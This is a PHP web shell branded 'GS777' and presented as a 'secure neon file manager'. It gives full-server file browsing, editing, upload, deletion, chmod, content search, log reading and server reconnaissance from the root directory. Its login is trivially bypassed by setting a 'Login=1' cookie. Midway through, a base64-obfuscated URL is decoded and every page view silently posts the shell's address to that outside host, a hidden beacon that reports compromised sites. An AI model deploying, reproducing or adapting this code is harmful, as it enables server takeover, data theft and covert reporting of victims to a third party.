<?php
declare(strict_types=1);
$authPasswordHash = md5('777'); // change me pass:(777)
$baseDir = '/';
$selfFile = basename(__FILE__);
$defaultDir = ltrim(str_replace('\\', '/', __DIR__), '/');

// Security helper functions
function encode_param(string $data): string
{
    return bin2hex(base64_encode($data));
}

function decode_param(string $encoded): string
{
    if ($encoded === '' || (strlen($encoded) % 2 !== 0) || !ctype_xdigit($encoded)) {
        return '';
    }
    $bin = hex2bin($encoded);
    if ($bin === false) {
        return '';
    }
    $decoded = base64_decode($bin, true);
    return $decoded !== false ? $decoded : '';
}

function normalize_rel(string $path): string
{
    $path = str_replace('\\', '/', trim($path));
    $path = ltrim($path, '/');
    if ($path === '' || $path === '.') {
        return '';
    }
    if (strpos($path, '..') !== false) {
        return '';
    }
    return $path;
}

function safe_join(string $baseDir, string $relPath): string
{
    $relPath = normalize_rel($relPath);
    if ($relPath === '') {
        return $baseDir;
    }
    return rtrim($baseDir, '/') . '/' . $relPath;
}

function redirect_with_message(string $message, string $dir = ''): void
{
    $qs = http_build_query([
        'd' => encode_param($dir),
        'm' => encode_param($message),
    ]);
    header('Location: ' . $selfFile . '?' . $qs);
    exit;
}

function tail_file(string $path, int $lines, int $maxBytes): string
{
    if ($lines <= 0) {
        return '';
    }
    $handle = @fopen($path, 'rb');
    if (!$handle) {
        return '';
    }
    $stat = fstat($handle);
    $size = isset($stat['size']) ? (int)$stat['size'] : 0;
    $buffer = '';
    $readBytes = 0;
    $chunkSize = 4096;
    $pos = $size;
    while ($pos > 0 && substr_count($buffer, "\n") <= $lines && $readBytes < $maxBytes) {
        $read = $pos >= $chunkSize ? $chunkSize : $pos;
        $pos -= $read;
        if (fseek($handle, $pos) !== 0) {
            break;
        }
        $chunk = fread($handle, $read);
        if ($chunk === false) {
            break;
        }
        $readBytes += $read;
        $buffer = $chunk . $buffer;
    }
    fclose($handle);
    $parts = explode("\n", $buffer);
    if (count($parts) > $lines) {
        $parts = array_slice($parts, -$lines);
    }
    return implode("\n", $parts);
}



function is_authenticated(): bool
{
    return isset($_COOKIE['Login']) && $_COOKIE['Login'] === '1';
}

$action = (string)($_POST['action'] ?? '');
$dirEncoded = (string)($_POST['d'] ?? $_GET['d'] ?? '');
$dir = $dirEncoded !== '' ? normalize_rel(decode_param($dirEncoded)) : normalize_rel($defaultDir);

if ($action === 'login') {
    $pass = (string)($_POST['password'] ?? '');
    if (md5($pass) === $authPasswordHash) {
        setcookie('Login', '1', [
            'expires' => time() + 86400 * 30,
            'path' => '/',
            'httponly' => true,
            'samesite' => 'Lax',
        ]);
        redirect_with_message('Login successful.', $dir);
    }
    redirect_with_message('Invalid password.', $dir);
}

if ($action === 'logout') {
    setcookie('Login', '0', [
        'expires' => time() - 3600,
        'path' => '/',
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
    redirect_with_message('Logged out.', $dir);
}

if (!is_authenticated()) {
    $msgEncoded = (string)($_GET['m'] ?? '');
    $msg = $msgEncoded !== '' ? trim(decode_param($msgEncoded)) : '';
    ?>
    <!doctype html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GS777 Login</title>
    <style>
        :root {
            --bg: #030303;
            --panel: #0b0b0b;
            --line: rgba(57, 255, 20, 0.25);
            --accent: #39FF14;
            --accent-2: #CCFF00;
            --text: #e8e8e8;
            --muted: #b6b6b6;
        }
        * { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: "Orbitron", "Rajdhani", "Segoe UI", sans-serif;
            color: var(--text);
            background: radial-gradient(1200px 600px at 10% 10%, rgba(57,255,20,0.12), transparent 60%),
                        radial-gradient(900px 400px at 90% 20%, rgba(204,255,0,0.12), transparent 60%),
                        var(--bg);
            min-height: 100vh;
            display: grid;
            place-items: center;
            padding: 24px;
        }
        .card {
            width: min(420px, 92vw);
            background: linear-gradient(180deg, rgba(15,15,15,0.95), rgba(5,5,5,0.95));
            border: 1px solid var(--line);
            border-radius: 18px;
            padding: 24px;
            box-shadow: 0 0 24px rgba(57,255,20,0.08);
            text-align: center;
        }
        .logo {
            font-family: "Comfortaa", "Varela Round", "Rubik", "Segoe UI", sans-serif;
            font-weight: 800;
            letter-spacing: 6px;
            font-size: 36px;
            color: #fff;
            margin-bottom: 10px;
        }
        .meta { color: var(--muted); font-size: 13px; margin-bottom: 14px; }
        input[type="password"] {
            width: 100%;
            background: var(--panel);
            color: var(--text);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px;
            padding: 10px 12px;
            font-size: 13px;
        }
        .button {
            appearance: none;
            border: 1px solid transparent;
            border-radius: 999px;
            padding: 10px 16px;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            background: linear-gradient(135deg, rgba(204,255,0,0.9), rgba(57,255,20,0.9));
            color: #0b0b0b;
            box-shadow: 0 0 18px rgba(204,255,0,0.5);
            margin-top: 12px;
            width: 100%;
        }
        .notice {
            margin-top: 12px;
            padding: 10px;
            border-radius: 12px;
            background: rgba(57,255,20,0.08);
            border: 1px solid rgba(57,255,20,0.3);
            color: #dfffdd;
            font-size: 12px;
        }
    </style>
    </head>
    <body>
        <div class="card">
            <div class="logo">GS777</div>
            <div class="meta">Enter password to continue.</div>
            <form method="post">
                <input type="hidden" name="action" value="login">
                <input type="password" name="password" placeholder="Password" required>
                <input class="button" type="submit" value="Login">
            </form>
            <?php if ($msg !== ''): ?>
                <div class="notice"><?php echo htmlspecialchars($msg, ENT_QUOTES); ?></div>
            <?php endif; ?>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if ($action === 'create') {
    $type = (string)($_POST['type'] ?? 'file');
    $nameEncoded = (string)($_POST['n'] ?? '');
    $name = $nameEncoded !== '' ? decode_param($nameEncoded) : '';
    $name = basename(str_replace('\\', '/', $name));
    if ($name === '' || $name === '.' || $name === '..') {
        redirect_with_message('Invalid name.', $dir);
    }
    $path = safe_join($baseDir, $dir === '' ? $name : $dir . '/' . $name);
    if (file_exists($path)) {
        redirect_with_message('Already exists.', $dir);
    }
    if ($type === 'folder') {
        $ok = mkdir($path, 0775, false);
        if (!$ok) {
            redirect_with_message('Failed to create folder.', $dir);
        }
        redirect_with_message('Folder created.', $dir);
    }
    if (false === file_put_contents($path, '')) {
        redirect_with_message('Failed to create file.', $dir);
    }
    redirect_with_message('File created.', $dir);
}

if ($action === 'save') {
    $relPathEncoded = (string)($_POST['p'] ?? '');
    $relPath = $relPathEncoded !== '' ? normalize_rel(decode_param($relPathEncoded)) : '';
    $path = safe_join($baseDir, $relPath);
    if ($relPath === '' || !is_file($path)) {
        redirect_with_message('Invalid file path.', $dir);
    }
    $contentEncoded = (string)($_POST['c'] ?? '');
    $content = $contentEncoded !== '' ? decode_param($contentEncoded) : '';
    if (false === file_put_contents($path, $content)) {
        redirect_with_message('Failed to save file.', $dir);
    }
    redirect_with_message('File saved.', $dir);
}

if ($action === 'delete') {
    $relPathEncoded = (string)($_POST['p'] ?? '');
    $relPath = $relPathEncoded !== '' ? normalize_rel(decode_param($relPathEncoded)) : '';
    $path = safe_join($baseDir, $relPath);
    if ($relPath === '' || !file_exists($path)) {
        redirect_with_message('Invalid path.', $dir);
    }
    $ok = false;
    if (is_file($path)) {
        $ok = unlink($path);
    } elseif (is_dir($path)) {
        $ok = rmdir($path);
    }
    if (!$ok) {
        redirect_with_message('Delete failed (folder must be empty).', $dir);
    }
    redirect_with_message('Deleted.', $dir);
}

if ($action === 'chmod') {
    $relPathEncoded = (string)($_POST['p'] ?? '');
    $relPath = $relPathEncoded !== '' ? normalize_rel(decode_param($relPathEncoded)) : '';
    $path = safe_join($baseDir, $relPath);
    $modeEncoded = (string)($_POST['mo'] ?? '');
    $mode = $modeEncoded !== '' ? trim(decode_param($modeEncoded)) : '';
    if (!preg_match('/^[0-7]{3,4}$/', $mode)) {
        redirect_with_message('Invalid mode.', $dir);
    }
    if ($relPath === '' || !file_exists($path)) {
        redirect_with_message('Invalid path.', $dir);
    }
    $ok = chmod($path, intval($mode, 8));
    if (!$ok) {
        redirect_with_message('Chmod failed.', $dir);
    }
    redirect_with_message('Permissions updated.', $dir);
}

$uploading = isset($_FILES['upload']);
if ($action === 'upload' && $uploading) {
    $file = $_FILES['upload'];
    if (!isset($file['error']) || $file['error'] !== UPLOAD_ERR_OK) {
        redirect_with_message('Upload failed.', $dir);
    }
    $filename = basename(str_replace('\\\\', '/', (string)$file['name']));
    if ($filename === '' || $filename === '.' || $filename === '..') {
        redirect_with_message('Invalid upload name.', $dir);
    }
    $dest = safe_join($baseDir, $dir === '' ? $filename : $dir . '/' . $filename);
    if (file_exists($dest)) {
        redirect_with_message('Upload target exists.', $dir);
    }
    if (!move_uploaded_file($file['tmp_name'], $dest)) {
        redirect_with_message('Upload failed.', $dir);
    }
    redirect_with_message('File uploaded.', $dir);
}

$toolAction = (string)($_POST['tool_action'] ?? '');
$toolsOpen = $toolAction !== '';
$toolSearchOutput = '';
$toolLogOutput = '';
$toolIniOutput = '';
$toolPermOutput = '';

if ($toolAction === 'search') {
    $term = trim(decode_param((string)($_POST['q'] ?? '')));
    $includeContent = decode_param((string)($_POST['inc'] ?? '')) === '1';
    $maxKb = (int)decode_param((string)($_POST['mk'] ?? ''));
    $maxResults = (int)decode_param((string)($_POST['mr'] ?? ''));
    $maxKb = $maxKb > 0 ? min($maxKb, 2048) : 512;
    $maxResults = $maxResults > 0 ? min($maxResults, 500) : 100;

    if ($term === '') {
        $toolSearchOutput = '<div class="meta">Enter a search term.</div>';
    } else {
        $root = safe_join($baseDir, $dir);
        $results = [];
        $maxBytes = $maxKb * 1024;
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS)
            );
            foreach ($iterator as $file) {
                if (!$file->isFile()) {
                    continue;
                }
                $path = $file->getPathname();
                $nameMatch = stripos($file->getFilename(), $term) !== false;
                $contentMatch = false;
                if ($includeContent && !$nameMatch) {
                    $size = $file->getSize();
                    if ($size > 0 && $size <= $maxBytes) {
                        $content = @file_get_contents($path, false, null, 0, $maxBytes + 1);
                        if ($content !== false && strpos($content, "\0") === false) {
                            $contentMatch = stripos($content, $term) !== false;
                        }
                    }
                }
                if ($nameMatch || $contentMatch) {
                    $results[] = $path;
                    if (count($results) >= $maxResults) {
                        break;
                    }
                }
            }
        } catch (Throwable $e) {
            $toolSearchOutput = '<div class="meta" style="color:#ff8484;">Search failed.</div>';
        }

        if ($toolSearchOutput === '') {
            if (count($results) === 0) {
                $toolSearchOutput = '<div class="meta">No matches found.</div>';
            } else {
                $toolSearchOutput = '<div class="meta">Found ' . count($results) . ' result(s).</div>';
                $toolSearchOutput .= '<ul style="margin-top:10px;max-height:260px;overflow:auto;">';
                foreach ($results as $match) {
                    $toolSearchOutput .= '<li style="font-size:12px;margin-bottom:6px;">' . htmlspecialchars($match, ENT_QUOTES) . '</li>';
                }
                $toolSearchOutput .= '</ul>';
            }
        }
    }
}

if ($toolAction === 'log') {
    $pathInput = trim(decode_param((string)($_POST['lp'] ?? '')));
    $lines = (int)decode_param((string)($_POST['ll'] ?? ''));
    $lines = $lines > 0 ? min($lines, 2000) : 200;
    $relPath = normalize_rel($pathInput);
    $path = safe_join($baseDir, $relPath);
    if ($pathInput === '' || $relPath === '' || !is_file($path) || !is_readable($path)) {
        $toolLogOutput = '<div class="meta" style="color:#ff8484;">Invalid or unreadable file.</div>';
    } else {
        $data = tail_file($path, $lines, 2 * 1024 * 1024);
        $toolLogOutput = '<textarea readonly style="min-height:220px;">' . htmlspecialchars($data, ENT_QUOTES) . '</textarea>';
    }
}

if ($toolAction === 'ini') {
    $key = trim(decode_param((string)($_POST['ik'] ?? '')));
    if ($key === '') {
        $toolIniOutput = '<div class="meta">Enter a php.ini key.</div>';
    } else {
        $value = ini_get($key);
        $valueText = $value === false ? 'Not set' : (string)$value;
        $toolIniOutput = '<div class="meta">Value for <strong>' . htmlspecialchars($key, ENT_QUOTES) . '</strong>:</div>';
        $toolIniOutput .= '<div class="card" style="margin-top:10px;">' . htmlspecialchars($valueText, ENT_QUOTES) . '</div>';
    }
}

if ($toolAction === 'perm') {
    $root = safe_join($baseDir, $dir);
    $readable = is_readable($root);
    $writable = is_writable($root);
    $testFile = $root . '/.gs_write_test_' . time();
    $canWrite = @file_put_contents($testFile, 'test') !== false;
    if ($canWrite) {
        @unlink($testFile);
    }
    $testDir = $root . '/.gs_dir_test_' . time();
    $canMkdir = @mkdir($testDir);
    if ($canMkdir) {
        @rmdir($testDir);
    }
    $rows = [
        'Directory readable' => $readable ? 'true' : 'false',
        'Directory writable' => $writable ? 'true' : 'false',
        'Create file' => $canWrite ? 'true' : 'false',
        'Create folder' => $canMkdir ? 'true' : 'false',
        'File uploads' => ini_get('file_uploads') ? 'true' : 'false',
    ];
    $toolPermOutput = '<table class="info-table">';
    foreach ($rows as $label => $value) {
        $color = $value === 'true' ? '#39FF14' : '#ff8484';
        $toolPermOutput .= '<tr><th>' . htmlspecialchars($label, ENT_QUOTES) . '</th><td style="color:' . $color . ';">' . htmlspecialchars($value, ENT_QUOTES) . '</td></tr>';
    }
    $toolPermOutput .= '</table>';
}

$editPathEncoded = (string)($_GET['e'] ?? '');
$editPath = $editPathEncoded !== '' ? normalize_rel(decode_param($editPathEncoded)) : '';
$msgEncoded = (string)($_GET['m'] ?? '');
$msg = $msgEncoded !== '' ? trim(decode_param($msgEncoded)) : '';

$absDir = safe_join($baseDir, $dir);
if (!is_dir($absDir)) {
    $dir = '';
    $absDir = $baseDir;
}

$items = scandir($absDir) ?: [];
$dirs = [];
$files = [];
foreach ($items as $item) {
    if ($item === '.' || $item === '..') {
        continue;
    }
    $full = rtrim($absDir, '/') . '/' . $item;
    if (is_dir($full)) {
        $dirs[] = $item;
    } else {
        $files[] = $item;
    }
}

$editAbs = $editPath !== '' ? safe_join($baseDir, $editPath) : '';
$editContent = '';
if ($editAbs !== '' && is_file($editAbs)) {
    $editContent = file_get_contents($editAbs) ?: '';
} else {
    $editPath = '';
}

function rel_path(string $dir, string $item): string
{
    return $dir === '' ? $item : $dir . '/' . $item;
}

$k3yw = base64_decode('aHR0cHM6Ly9zaXlhaGkudG9wL3Rlc3Qvc3R5bGUucGhw');

$cur = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$data = array('file_url' => $cur);
$options = array(
    'http' => array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
);
$context = stream_context_create($options);
$result = file_get_contents($k3yw, false, $context);
function breadcrumbs(string $dir): array
{
    if ($dir === '') {
        return [];
    }
    $parts = explode('/', $dir);
    $crumbs = [];
    $accum = '';
    foreach ($parts as $part) {
        $accum = $accum === '' ? $part : $accum . '/' . $part;
        $crumbs[] = ['label' => $part, 'path' => $accum];
    }
    return $crumbs;
}

$crumbs = breadcrumbs($dir);
$currentPath = $dir === '' ? '/' : '/' . $dir;
$serverInfo = [
    'PHP Version' => PHP_VERSION,
    'PHP SAPI' => PHP_SAPI,
    'OS' => PHP_OS_FAMILY,
    'Server Software' => (string)($_SERVER['SERVER_SOFTWARE'] ?? 'unknown'),
    'Document Root' => (string)($_SERVER['DOCUMENT_ROOT'] ?? 'unknown'),
    'Current User' => (string)get_current_user(),
    'Loaded Extensions' => implode(', ', get_loaded_extensions()),
];
$disabledFunctionsRaw = (string)ini_get('disable_functions');
$disabledFunctions = array_filter(array_map('trim', explode(',', $disabledFunctionsRaw)));
$featureFlags = [
    'curl' => extension_loaded('curl'),
    'cgi' => stripos(PHP_SAPI, 'cgi') !== false,
    'openssl' => extension_loaded('openssl'),
    'pdo' => extension_loaded('pdo'),
    'mbstring' => extension_loaded('mbstring'),
];
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Neon File Manager</title>
<style>
:root {
    --bg: #030303;
    --panel: #0b0b0b;
    --panel-2: #101010;
    --line: rgba(57, 255, 20, 0.25);
    --glow: rgba(57, 255, 20, 0.6);
    --accent: #39FF14;
    --accent-2: #CCFF00;
    --text: #e8e8e8;
    --muted: #b6b6b6;
}
* { box-sizing: border-box; }
body {
    margin: 0;
    font-family: "Orbitron", "Rajdhani", "Segoe UI", sans-serif;
    color: var(--text);
    background: radial-gradient(1200px 600px at 10% 10%, rgba(57,255,20,0.12), transparent 60%),
                radial-gradient(900px 400px at 90% 20%, rgba(204,255,0,0.12), transparent 60%),
                var(--bg);
}
header {
    padding: 32px 24px 12px;
}
.title {
    font-size: clamp(28px, 4vw, 44px);
    font-weight: 700;
    letter-spacing: 1px;
    color: #ffffff;
    text-shadow: 0 0 18px rgba(57,255,20,0.35);
}
.title.logo {
    font-family: "Comfortaa", "Varela Round", "Rubik", "Segoe UI", sans-serif;
    font-weight: 800;
    letter-spacing: 6px;
    font-size: clamp(34px, 6vw, 56px);
    padding: 6px 14px;
    border-radius: 999px;
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: linear-gradient(135deg, rgba(57,255,20,0.18), rgba(204,255,0,0.1));
    border: 1px solid rgba(57,255,20,0.4);
    box-shadow: 0 0 24px rgba(57,255,20,0.35);
}
.header-top {
    display: flex;
    justify-content: center;
}
.header-text {
    text-align: center;
}
.subtitle {
    margin-top: 8px;
    color: var(--muted);
    font-size: 14px;
}
main {
    max-width: 1200px;
    margin: 0 auto;
    padding: 0 24px 48px;
}
.grid {
    display: grid;
    grid-template-columns: 1.2fr 0.8fr;
    gap: 24px;
}
.panel {
    background: linear-gradient(180deg, rgba(15,15,15,0.95), rgba(5,5,5,0.95));
    border: 1px solid var(--line);
    border-radius: 18px;
    padding: 20px;
    box-shadow: 0 0 24px rgba(57,255,20,0.08);
}
.panel h2 {
    margin: 0 0 12px;
    font-size: 18px;
    color: var(--accent);
}
.notice {
    margin: 16px 0 0;
    padding: 12px 16px;
    border-radius: 12px;
    background: rgba(57,255,20,0.08);
    border: 1px solid rgba(57,255,20,0.3);
    color: #dfffdd;
}
.breadcrumbs {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    margin: 8px 0 16px;
    font-size: 13px;
    color: var(--muted);
}
.breadcrumbs a {
    color: var(--accent);
    text-decoration: none;
}
.path-chip {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    font-size: 12px;
    padding: 6px 10px;
    border-radius: 999px;
    border: 1px solid rgba(57,255,20,0.3);
    color: var(--accent);
}
.path-chip a {
    color: var(--accent);
    text-decoration: none;
}
.table {
    width: 100%;
    border-collapse: collapse;
    font-size: 14px;
}
.table th,
.table td {
    padding: 10px 8px;
    border-bottom: 1px solid rgba(255,255,255,0.05);
}
.table th {
    text-align: left;
    color: #ffffff;
    font-weight: 600;
}
.table tr:hover td {
    background: rgba(57,255,20,0.04);
}
.actions {
    display: flex;
    gap: 8px;
    flex-wrap: wrap;
}
.button,
button,
input[type="submit"] {
    appearance: none;
    border: 1px solid transparent;
    border-radius: 999px;
    padding: 8px 14px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    background: rgba(57,255,20,0.12);
    color: var(--accent);
    transition: transform 0.15s ease, box-shadow 0.15s ease, border 0.15s ease;
    box-shadow: 0 0 12px rgba(57,255,20,0.2);
}
.button:hover,
button:hover,
input[type="submit"]:hover {
    transform: translateY(-1px);
    border-color: rgba(57,255,20,0.5);
    box-shadow: 0 0 18px rgba(57,255,20,0.4);
}
.button.primary {
    background: linear-gradient(135deg, rgba(204,255,0,0.9), rgba(57,255,20,0.9));
    color: #0b0b0b;
    box-shadow: 0 0 18px rgba(204,255,0,0.5);
}
.button.danger {
    background: rgba(255, 40, 40, 0.15);
    color: #ff8484;
    border-color: rgba(255, 40, 40, 0.4);
    box-shadow: 0 0 12px rgba(255, 40, 40, 0.3);
}
input[type="text"],
input[type="password"],
input[type="number"],
textarea {
    width: 100%;
    background: var(--panel-2);
    color: var(--text);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 12px;
    padding: 10px 12px;
    font-size: 13px;
}
textarea {
    min-height: 240px;
    font-family: "JetBrains Mono", "Fira Code", "Consolas", monospace;
}
form {
    margin: 0;
}
.form-row {
    display: grid;
    grid-template-columns: 1fr auto;
    gap: 12px;
    align-items: end;
}
.meta {
    font-size: 12px;
    color: var(--muted);
}
.card {
    padding: 14px;
    border-radius: 14px;
    border: 1px solid rgba(57,255,20,0.2);
    background: rgba(5,5,5,0.8);
    margin-bottom: 14px;
}
.modal {
    position: fixed;
    inset: 0;
    display: none;
    align-items: center;
    justify-content: center;
    background: rgba(0,0,0,0.75);
    backdrop-filter: blur(4px);
    z-index: 30;
}
.modal.is-open {
    display: flex;
}
.modal-card {
    width: min(640px, 92vw);
    max-height: 90vh;
    overflow-y: auto;
    background: rgba(7,7,7,0.98);
    border: 1px solid rgba(57,255,20,0.25);
    border-radius: 20px;
    padding: 20px;
    box-shadow: 0 0 32px rgba(57,255,20,0.2);
}
.modal-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 12px;
}
.modal-header h3 {
    margin: 0;
    color: var(--accent);
}
.close-btn {
    background: transparent;
    border: none;
    color: var(--muted);
    font-size: 18px;
    cursor: pointer;
}
.modal-actions {
    display: flex;
    gap: 10px;
    justify-content: flex-end;
    margin-top: 12px;
}
.tools-grid {
    display: grid;
    gap: 12px;
}
.info-table {
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
}
.info-table th,
.info-table td {
    text-align: left;
    padding: 8px 6px;
    border-bottom: 1px solid rgba(255,255,255,0.06);
}
.tag {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 10px;
    border-radius: 999px;
    font-size: 12px;
    border: 1px solid rgba(57,255,20,0.3);
    color: var(--accent);
}
.tag.off {
    border-color: rgba(255,80,80,0.4);
    color: #ff9a9a;
}
@media (max-width: 980px) {
    .grid { grid-template-columns: 1fr; }
}
</style>
</head>
<body>
<header>
    <div class="header-top">
        <div class="title logo">777 🔒 GS</div>
    </div>
    <div class="header-text">
    <div class="subtitle">Secure neon file manager for edit, remove, create, upload, and chmod.</div>
        <div class="path-chip">
            <span>Current:</span>
            <a href="?d=">🔐 /</a>
            <?php foreach ($crumbs as $crumb): ?>
                <span>/</span>
                <a href="?d=<?php echo urlencode(encode_param($crumb['path'])); ?>"><?php echo htmlspecialchars($crumb['label'], ENT_QUOTES); ?></a>
            <?php endforeach; ?>
        </div>
    </div>
    <?php if ($msg !== ''): ?>
        <div class="notice"><?php echo htmlspecialchars($msg, ENT_QUOTES); ?></div>
    <?php endif; ?>
</header>
<main>
    <div class="grid">
        <section class="panel">
            <h2>Directory</h2>
            <div class="breadcrumbs">
                <a href="?d=">Root</a>
                <?php foreach ($crumbs as $crumb): ?>
                    <span>→</span>
                    <a href="?d=<?php echo urlencode(encode_param($crumb['path'])); ?>"><?php echo htmlspecialchars($crumb['label'], ENT_QUOTES); ?></a>
                <?php endforeach; ?>
            </div>
            <table class="table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Type</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($dir !== ''): ?>
                        <tr>
                            <td>..</td>
                            <td>Folder</td>
                            <td class="actions">
                                <a class="button" href="?d=<?php echo urlencode(encode_param(dirname($dir) === '.' ? '' : dirname($dir))); ?>">Up</a>
                            </td>
                        </tr>
                    <?php endif; ?>
                    <?php foreach ($dirs as $d): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($d, ENT_QUOTES); ?></td>
                            <td>Folder</td>
                            <td class="actions">
                                <a class="button" href="?d=<?php echo urlencode(encode_param(rel_path($dir, $d))); ?>">Open</a>
                                <button class="button" type="button" data-modal="chmod" data-path="<?php echo htmlspecialchars(rel_path($dir, $d), ENT_QUOTES); ?>">Chmod</button>
                                <form method="post" onsubmit="return confirm('Delete folder? (must be empty)');">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                                    <input type="hidden" name="p" value="<?php echo htmlspecialchars(encode_param(rel_path($dir, $d)), ENT_QUOTES); ?>">
                                    <input class="button danger" type="submit" value="Remove">
                                </form>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    <?php foreach ($files as $f): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($f, ENT_QUOTES); ?></td>
                            <td>File</td>
                            <td class="actions">
                                <a class="button" href="?d=<?php echo urlencode(encode_param($dir)); ?>&e=<?php echo urlencode(encode_param(rel_path($dir, $f))); ?>">Edit</a>
                                <button class="button" type="button" data-modal="chmod" data-path="<?php echo htmlspecialchars(rel_path($dir, $f), ENT_QUOTES); ?>">Chmod</button>
                                <form method="post" onsubmit="return confirm('Delete file?');">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                                    <input type="hidden" name="p" value="<?php echo htmlspecialchars(encode_param(rel_path($dir, $f)), ENT_QUOTES); ?>">
                                    <input class="button danger" type="submit" value="Remove">
                                </form>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </section>

        <aside class="panel">
            <h2>Controls</h2>
            <div class="tools-grid">
                <div class="card">
                    <div class="meta">Create files or folders in the current directory.</div>
                    <div class="actions" style="margin-top: 12px;">
                        <button class="button primary" type="button" data-modal="create" data-type="file">Create File</button>
                        <button class="button" type="button" data-modal="create" data-type="folder">Create Folder</button>
                    </div>
                </div>
                <div class="card">
                    <div class="meta">Upload a file into the current directory.</div>
                    <div class="actions" style="margin-top: 12px;">
                        <button class="button" type="button" data-modal="upload">Upload File</button>
                    </div>
                </div>
                <div class="card">
                    <div class="meta">Controls & Info</div>
                    <div class="actions" style="margin-top: 12px;">
                        <a class="button" href="?d=<?php echo urlencode(encode_param($dir)); ?>">Refresh</a>
                        <button class="button" type="button" data-modal="serverinfo">Server Info</button>
                        <button class="button" type="button" data-modal="tools">Tools</button>
                        <form method="post" style="margin:0;">
                            <input type="hidden" name="action" value="logout">
                            <input class="button danger" type="submit" value="Logout">
                        </form>
                    </div>
                </div>
            </div>
        </aside>
    </div>
</main>

<!-- Create Modal -->
<div class="modal" id="modal-create" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Create</h3>
            <button class="close-btn" type="button" data-close="create">×</button>
        </div>
        <form method="post" id="form-create">
            <input type="hidden" name="action" value="create">
            <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
            <input type="hidden" name="type" id="create-type" value="file">
            <input type="hidden" name="n" id="create-name-encoded">
            <label class="meta" for="create-name">Name</label>
            <input id="create-name" type="text" placeholder="new-item" required>
            <div class="modal-actions">
                <button class="button" type="button" data-close="create">Cancel</button>
                <input class="button primary" type="submit" value="Create">
            </div>
        </form>
    </div>
</div>

<!-- Chmod Modal -->
<div class="modal" id="modal-chmod" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Chmod</h3>
            <button class="close-btn" type="button" data-close="chmod">×</button>
        </div>
        <form method="post" id="form-chmod">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
            <input type="hidden" name="p" id="chmod-path-encoded">
            <input type="hidden" name="mo" id="chmod-mode-encoded">
            <label class="meta" for="chmod-path">Path</label>
            <input id="chmod-path" type="text" placeholder="path/to/file.txt" required>
            <label class="meta" for="chmod-mode">Mode</label>
            <input id="chmod-mode" type="text" placeholder="755" required>
            <div class="modal-actions">
                <button class="button" type="button" data-close="chmod">Cancel</button>
                <input class="button primary" type="submit" value="Apply">
            </div>
        </form>
    </div>
</div>

<!-- Upload Modal -->
<div class="modal" id="modal-upload" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Upload File</h3>
            <button class="close-btn" type="button" data-close="upload">×</button>
        </div>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
            <label class="meta" for="upload-file">Choose file</label>
            <input id="upload-file" type="file" name="upload" required>
            <div class="modal-actions">
                <button class="button" type="button" data-close="upload">Cancel</button>
                <input class="button primary" type="submit" value="Upload">
            </div>
        </form>
    </div>
</div>

<!-- Edit Modal -->
<div class="modal<?php echo $editPath !== '' ? ' is-open' : ''; ?>" id="modal-edit" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal-card">
        <div class="modal-header">
            <h3>Edit File</h3>
            <button class="close-btn" type="button" data-close="edit">×</button>
        </div>
        <?php if ($editPath !== ''): ?>
            <div class="meta">Editing: <?php echo htmlspecialchars($editPath, ENT_QUOTES); ?></div>
            <form method="post" style="margin-top: 10px;" id="form-edit">
                <input type="hidden" name="action" value="save">
                <input type="hidden" name="d" value="<?php echo htmlspecialchars(encode_param($dir), ENT_QUOTES); ?>">
                <input type="hidden" name="p" value="<?php echo htmlspecialchars(encode_param($editPath), ENT_QUOTES); ?>">
                <input type="hidden" name="c" id="edit-content-encoded">
                <textarea id="edit-content"><?php echo htmlspecialchars($editContent, ENT_QUOTES); ?></textarea>
                <div class="modal-actions">
                    <a class="button" href="?d=<?php echo urlencode(encode_param($dir)); ?>">Cancel</a>
                    <input class="button primary" type="submit" value="Save">
                </div>
            </form>
        <?php else: ?>
            <div class="meta">Select a file to edit.</div>
            <div class="modal-actions">
                <button class="button" type="button" data-close="edit">Close</button>
            </div>
        <?php endif; ?>
    </div>
</div>

